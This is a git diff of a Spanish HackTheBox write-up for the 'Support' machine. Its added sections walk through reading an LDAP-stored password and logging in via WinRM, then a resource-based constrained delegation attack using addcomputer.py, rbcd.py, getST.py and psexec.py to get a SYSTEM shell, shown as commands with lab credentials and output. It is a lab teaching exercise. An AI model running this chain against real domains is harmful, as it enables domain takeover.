@@ -4,6 +4,7 @@ title: Support
 description: Cuenta con un recurso compartido SMB que permite la autenticación anónima. Tras conectarse al recurso compartido, se descubre un archivo ejecutable que se utiliza para consultar el servidor LDAP de la máquina en busca de usuarios disponibles. Mediante ingeniería inversa, análisis de red o emulación, se identifica la contraseña que el binario utiliza para vincularse al servidor LDAP y se puede utilizar para realizar consultas LDAP adicionales. Se identifica un usuario llamado support en la lista de usuarios, y se encuentra que el campo info contiene su contraseña, lo que permite una conexión WinRM a la máquina. Una vez dentro de la máquina, se puede recopilar información del dominio mediante SharpHound, y BloodHound revela que el grupo Shared Support Accounts, al que pertenece el usuario support, tiene privilegios GenericAll en el controlador de dominio. Se realiza un ataque de delegación restringida basada en recursos y se recibe una shell como NT Authority\System.
 lang: es
 draft: false
+featured: true
 image: ../../../../images/writeups/hackthebox/machines/support/support.png
 platform: hackthebox
 url: https://app.hackthebox.com/machines/Support
@@ -333,7 +334,7 @@ internal class LdapQuery
 }
 ```
 
-Con esta información podemos obtener la contraseña haciendo el proceso inverso con Python.
+Con esta información podemos obtener la contraseña haciendo el proceso inverso con `Python`.
 
 `getpass.py`
 
@@ -361,37 +362,187 @@ python3 getpass.py
 nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
-Con las credenciales obtenidas enumeramos usuarios mediante el servicio `ldap`.
+Listamos el campo `info` de todos los usuarios para ver si encontramos información sensible.
 
 ```bash
-nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
+nxc ldap support.htb --dns-server 10.129.68.160 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-info-users
 ```
 
 ```plaintext
-LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert) 
-LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
-LDAP        10.129.230.181  389    DC               [*] Enumerated 20 domain users: support.htb
-LDAP        10.129.230.181  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
-LDAP        10.129.230.181  389    DC               Administrator                 2022-07-19 14:55:56 0        Built-in account for administering the computer/domain      
-LDAP        10.129.230.181  389    DC               Guest                         2022-05-28 08:18:55 0        Built-in account for guest access to the computer/domain    
-LDAP        10.129.230.181  389    DC               krbtgt                        2022-05-28 08:03:43 0        Key Distribution Center Service Account                     
-LDAP        10.129.230.181  389    DC               ldap                          2022-05-28 08:11:46 0                                                                    
-LDAP        10.129.230.181  389    DC               support                       2022-05-28 08:12:00 0                                                                    
-LDAP        10.129.230.181  389    DC               smith.rosario                 2022-05-28 08:12:19 0                                                                    
-LDAP        10.129.230.181  389    DC               hernandez.stanley             2022-05-28 08:12:34 0                                                                    
-LDAP        10.129.230.181  389    DC               wilson.shelby                 2022-05-28 08:12:50 0                                                                    
-LDAP        10.129.230.181  389    DC               anderson.damian               2022-05-28 08:13:05 0                                                                    
-LDAP        10.129.230.181  389    DC               thomas.raphael                2022-05-28 08:13:21 0                                                                    
-LDAP        10.129.230.181  389    DC               levine.leopoldo               2022-05-28 08:13:37 0                                                                    
-LDAP        10.129.230.181  389    DC               raven.clifton                 2022-05-28 08:13:53 0                                                                    
-LDAP        10.129.230.181  389    DC               bardot.mary                   2022-05-28 08:14:08 0                                                                    
-LDAP        10.129.230.181  389    DC               cromwell.gerard               2022-05-28 08:14:24 0                                                                    
-LDAP        10.129.230.181  389    DC               monroe.david                  2022-05-28 08:14:39 0                                                                    
-LDAP        10.129.230.181  389    DC               west.laura                    2022-05-28 08:14:55 0                                                                    
-LDAP        10.129.230.181  389    DC               langley.lucy                  2022-05-28 08:15:10 0                                                                    
-LDAP        10.129.230.181  389    DC               daughtler.mabel               2022-05-28 08:15:26 0                                                                    
-LDAP        10.129.230.181  389    DC               stoll.rachelle                2022-05-28 08:15:42 0                                                                    
-LDAP        10.129.230.181  389    DC               ford.victoria                 2022-05-28 08:15:58 0
+LDAP        10.129.68.160   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.68.160   389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
+GET-INFO... 10.129.68.160   389    DC               [+] Found following users: 
+GET-INFO... 10.129.68.160   389    DC               User: support              Info: Ironside47pleasure40Watchful
 ```
 
-Guardamos los usuarios en un archivo `users.txt`.
+Encontramos la contraseña del usuario `support`.
+
+Con las credenciales del usuario `support` nos conectamos vía `WinRM`.
+
+```bash
+evil-winrm -i 10.129.68.160 -u support -p 'Ironside47pleasure40Watchful'
+```
+
+Listamos el contenido del escritorio.
+
+```powershell
+dir ..\Desktop
+```
+
+```plaintext
+    Directory: C:\Users\support\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---          8/1/2026   9:25 AM             34 user.txt
+```
+
+Leemos el contenido de la flag.
+
+```powershell
+type ..\Desktop\user.txt
+```
+
+### User flag
+
+<Callout type="success" title="User flag">
+0******************************9
+</Callout>
+
+## Privilege Escalation
+
+Recolectamos información para usar en `Bloodhound`.
+
+```bash
+nxc ldap support.htb --dns-server 10.129.68.160 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound -c All
+```
+
+```plaintext
+LDAP        10.129.68.160   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.68.160   389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
+LDAP        10.129.68.160   389    DC               Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
+LDAP        10.129.68.160   389    DC               Excluded collection methods: 
+LDAP        10.129.68.160   389    DC               Bloodhound data collection completed in 1M 11S
+LDAP        10.129.68.160   389    DC               Collecting ADCS data (CertiHound)...
+LDAP        10.129.68.160   389    DC               Found 0 certificate templates
+LDAP        10.129.68.160   389    DC               Found 0 Enterprise CAs
+LDAP        10.129.68.160   389    DC               Compressing output into /home/melvin/.nxc/logs/DC_10.129.68.160_2026-08-01_154627_bloodhound.zip
+```
+
+El usuario `support` es miembro del grupo `SHARED SUPPORT ACCOUNTS` lo que significa que hereda todos sus permisos de seguridad, incluso [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#with-genericall-over-a-computer) sobre el `Domain Controller`.
+
+![Support user privileges](@images/writeups/hackthebox/machines/support/support-bh.png)
+
+Creamos una `computer account`.
+
+```bash
+addcomputer.py -computer-name 'MELVIN$' -computer-pass 'P4$$w0rd' 'support.htb/support:Ironside47pleasure40Watchful'
+```
+
+```plaintext
+[*] Successfully added machine account MELVIN$ with password P4$$w0rd.
+```
+
+Verificamos que se creó correctamente.
+
+```powershell
+Get-ADComputer -identity MELVIN
+```
+
+```plaintext
+DistinguishedName : CN=MELVIN,CN=Computers,DC=support,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : MELVIN
+ObjectClass       : computer
+ObjectGUID        : be1f08b8-2416-4ffa-97e9-5433d529706b
+SamAccountName    : MELVIN$
+SID               : S-1-5-21-1677581083-3380853377-188903654-6101
+UserPrincipalName :
+```
+
+Modificamos el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` escribiendo el `SID` de la `computer account` que creamos dentro del atributo en el `DC`.
+
+```bash
+rbcd.py -delegate-from 'MELVIN$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
+```
+
+```plaintext
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] MELVIN$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     MELVIN$      (S-1-5-21-1677581083-3380853377-188903654-6102)
+```
+
+Verificamos que el `PrincipalsAllowedToDelegateToAccount` se seteó con el `SID` de la `computer account` que creamos.
+
+```powershell
+Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+```
+
+```plaintext
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
+DNSHostName                          : dc.support.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
+PrincipalsAllowedToDelegateToAccount : {S-1-5-21-1677581083-3380853377-188903654-6102}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
+UserPrincipalName                    :
+```
+
+Pedimos un ticket de servicio (`ST`) para el `SPN` `cifs/support.htb` utilizando la `computer account` creada.
+
+```bash
+getST.py -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/MELVIN$:P4$$w0rd'
+```
+
+```plaintext
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+```
+
+Exportamos la variable de entorno `KRB5CCNAME` para que se use el ticket guardado ahí a la hora de autenticarnos.
+
+```bash
+export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+```
+
+Nos autenticamos en el `DC` usando el ticket de `Kerberos` del `Administrator`.
+
+```bash
+psexec.py -k -no-pass dc.support.htb -dc-ip 10.129.68.160
+```
+
+```plaintext
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file XhpxIbgg.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service nKOB on dc.support.htb.....
+[*] Starting service nKOB.....
+[!] Press help for extra shell commands                                                                                                                                    Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+Leemos la flag.
+
+```powershell
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="Root flag">
+7******************************b
+</Callout>
